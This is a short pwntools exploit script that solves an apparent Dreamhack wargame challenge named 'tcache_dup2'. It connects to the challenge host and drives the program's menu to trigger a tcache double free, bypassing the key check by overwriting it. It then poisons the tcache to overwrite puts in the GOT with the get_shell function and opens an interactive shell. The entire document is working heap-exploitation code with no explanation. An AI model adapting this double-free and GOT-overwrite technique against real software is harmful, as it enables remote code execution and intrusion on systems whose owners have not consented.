from pwn import *

p = remote("host3.dreamhack.games", 21160)
e = ELF("./tcache_dup2")


def create(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)


def modify(idx, size, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)


def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())


get_shell = e.sym["get_shell"]
puts_got = e.got["puts"]

create(0x10, "AAAA")
create(0x10, "AAAA")
create(0x10, "AAAA")

delete(0)
delete(1)
delete(2)
modify(2, 0x10, "A" * 8 + "IT'S KEY")

delete(2)

create(0x10, p64(puts_got))
create(0x10, "AAAA")
create(0x10, p64(get_shell))

p.interactive()
